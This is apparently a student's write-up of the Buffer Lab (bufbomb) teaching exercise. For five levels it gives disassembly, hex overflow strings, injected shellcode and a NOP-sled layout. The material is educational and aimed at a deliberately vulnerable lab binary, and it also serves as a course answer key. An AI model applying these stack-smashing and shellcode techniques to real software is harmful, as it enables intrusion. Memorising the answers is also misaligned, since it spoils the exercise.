# Buffer Lab

## Level 0

As the assembly of `getbuf`:

```assembly
0x080491f4 <+0>:     push   ebp
0x080491f5 <+1>:     mov    ebp,esp
0x080491f7 <+3>:     sub    esp,0x38
0x080491fa <+6>:     lea    eax,[ebp-0x28]
0x080491fd <+9>:     mov    DWORD PTR [esp],eax
0x08049200 <+12>:    call   0x8048cfa <Gets>
0x08049205 <+17>:    mov    eax,0x1
0x0804920a <+22>:    leave
0x0804920b <+23>:    ret
```

we can see a buffer with 0x28(40) bytes is allocated on stack. So to finish level 0, just overflow 8 bytes and write up return address, the last 4 overflowed bytes are address to function call `smoke`. The answer is down below:

```c
00000000: 6161 6161 6161 6161 6161 6161 6161 6161 
00000010: 6161 6161 6161 6161 6161 6161 6161 6161 
00000020: 6161 6161 6161 6161 6161 6161 188c 0408 
00000030: 0a
```

## Level 1

In level 1 we need to modify return address to function `fizz` and set argument equal to cookie. Because `bufbomb` use IA32 architecture, the argument is always stored at higher address followed by return address of previous call stack, we can overflow 12 bytes, 4 for return address of `fizz` ,4 for placeholder and 4 for cookies:

```c
00000000: 6161 6161 6161 6161 6161 6161 6161 6161 
00000010: 6161 6161 6161 6161 6161 6161 6161 6161 
00000020: 6161 6161 6161 6161 6161 6161 428c 0408 
00000030: aaaa aaaa 7c81 fa57 0a
```

## Level 2

In level 2 we need to set a global variable `gloval_value` to our cookie and return `getbuf` to function `bang`. As the assembly of `bang`:

```assembly
0x08048c9d <+0>:     push   ebp
0x08048c9e <+1>:     mov    ebp,esp
0x08048ca0 <+3>:     sub    esp,0x18
0x08048ca3 <+6>:     mov    eax,ds:0x804d100
0x08048ca8 <+11>:    cmp    eax,DWORD PTR ds:0x804d108
0x08048cae <+17>:    jne    0x8048cd6 <bang+57>
0x08048cb0 <+19>:    mov    DWORD PTR [esp+0x8],eax
0x08048cb4 <+23>:    mov    DWORD PTR [esp+0x4],0x804a360
0x08048cbc <+31>:    mov    DWORD PTR [esp],0x1
0x08048cc3 <+38>:    call   0x80489c0 <__printf_chk@plt>
0x08048cc8 <+43>:    mov    DWORD PTR [esp],0x2
0x08048ccf <+50>:    call   0x804937b <validate>
0x08048cd4 <+55>:    jmp    0x8048cee <bang+81>
0x08048cd6 <+57>:    mov    DWORD PTR [esp+0x8],eax
0x08048cda <+61>:    mov    DWORD PTR [esp+0x4],0x804a50c
0x08048ce2 <+69>:    mov    DWORD PTR [esp],0x1
0x08048ce9 <+76>:    call   0x80489c0 <__printf_chk@plt>
0x08048cee <+81>:    mov    DWORD PTR [esp],0x0
0x08048cf5 <+88>:    call   0x8048900 <exit@plt>
```

We can see this global variable is stored at `0x804d100`. So the shellcode could be like this:

```assembly
a1 08 d1 04 08          mov    0x804d108,%eax
a3 00 d1 04 08          mov    %eax,0x804d100
68 9d 8c 04 08          push   $0x8048c9d
c3                      ret
```

And answer to this level might be like this:

```c
00000000: a108 d104 08a3 00d1 0408 689d 8c04 08c3
00000010: 6161 6161 6161 6161 6161 6161 6161 6161 
00000020: 6161 6161 6161 6161 6161 6161 6834 6855 
00000030: 0a
```

## Level 3

In level 3 we need to make function `test` jump to 'Boom' branch:

```c
void test()
{
    int val;
    /* Put canary on stack to detect possible corruption */
    volatile int local = uniqueval();

    val = getbuf();

    /* Check for corrupted stack */
    if (local != uniqueval()) {
    	printf("Sabotaged!: the stack has been corrupted\n");
    }
    else if (val == cookie) {
        printf("Boom!: getbuf returned 0x%x\n", val);
        validate(3);
    } else {
    	printf("Dud: getbuf returned 0x%x\n", val);
    }
}
```

However, the default return value of `getbuf()` is 1:

```c
int getbuf()
{
    char buf[NORMAL_BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

To make things changed, we need to take a look at assembly of `test`:

```assembly
0x08048daa <+0>:     push   ebp
0x08048dab <+1>:     mov    ebp,esp
0x08048dad <+3>:     push   ebx
0x08048dae <+4>:     sub    esp,0x24
0x08048db1 <+7>:     call   0x8048d90 <uniqueval>
0x08048db6 <+12>:    mov    DWORD PTR [ebp-0xc],eax
0x08048db9 <+15>:    call   0x80491f4 <getbuf>
0x08048dbe <+20>:    mov    ebx,eax
0x08048dc0 <+22>:    call   0x8048d90 <uniqueval>
0x08048dc5 <+27>:    mov    edx,DWORD PTR [ebp-0xc]
0x08048dc8 <+30>:    cmp    eax,edx
0x08048dca <+32>:    je     0x8048dda <test+48>
0x08048dcc <+34>:    mov    DWORD PTR [esp],0x804a388
0x08048dd3 <+41>:    call   0x80488c0 <puts@plt>
0x08048dd8 <+46>:    jmp    0x8048e20 <test+118>
0x08048dda <+48>:    cmp    ebx,DWORD PTR ds:0x804d108
0x08048de0 <+54>:    jne    0x8048e08 <test+94>
0x08048de2 <+56>:    mov    DWORD PTR [esp+0x8],ebx
0x08048de6 <+60>:    mov    DWORD PTR [esp+0x4],0x804a52a
0x08048dee <+68>:    mov    DWORD PTR [esp],0x1
0x08048df5 <+75>:    call   0x80489c0 <__printf_chk@plt>
0x08048dfa <+80>:    mov    DWORD PTR [esp],0x3
0x08048e01 <+87>:    call   0x804937b <validate>
0x08048e06 <+92>:    jmp    0x8048e20 <test+118>
0x08048e08 <+94>:    mov    DWORD PTR [esp+0x8],ebx
0x08048e0c <+98>:    mov    DWORD PTR [esp+0x4],0x804a547
0x08048e14 <+106>:   mov    DWORD PTR [esp],0x1
0x08048e1b <+113>:   call   0x80489c0 <__printf_chk@plt>
0x08048e20 <+118>:   add    esp,0x24
0x08048e23 <+121>:   pop    ebx
0x08048e24 <+122>:   pop    ebp
0x08048e25 <+123>:   ret
```

Noted that in essential these two if expression just compare value with `eax,edx` and `edx, DWORD PTR ds:0x804d108`, so just make these value equal to each other and then return to address of comparison is OK:

```assembly
89 c2                   mov    %eax,%edx
8b 1d 08 d1 04 08       mov    0x804d108,%ebx
68 c8 8d 04 08          push   $0x8048dc8
c3                      ret
```

And the solution might look like this:

```c
00000000: 89c2 8b1d 08d1 0408 68c8 8d04 08c3 6161  
00000010: 6161 6161 6161 6161 6161 6161 6161 6161 
00000020: 6161 6161 6161 6161 6161 6161 6834 6855 
00000030: 0a
```

## Level 4

In this level, we need to do same thing as level 3 but 5 times, and the address of buffer would varies ±240 bytes in stack. To deal with this, just makes use of `nop` instructions and set up return address, makes it certainly fall into area of buffer. So the layout of solution might look like this:

- 506 bytes for `nop`(0x90).
- 14 bytes for shellcode instructions, as same as level 3.
- 4 bytes for return address[0x55683468 + 0xf0(240)]

Just as below:

```c
90 ....(506 times)
89c2 8b1d 08d1 0408 68c8 8d04 08c3
7833 6855
```

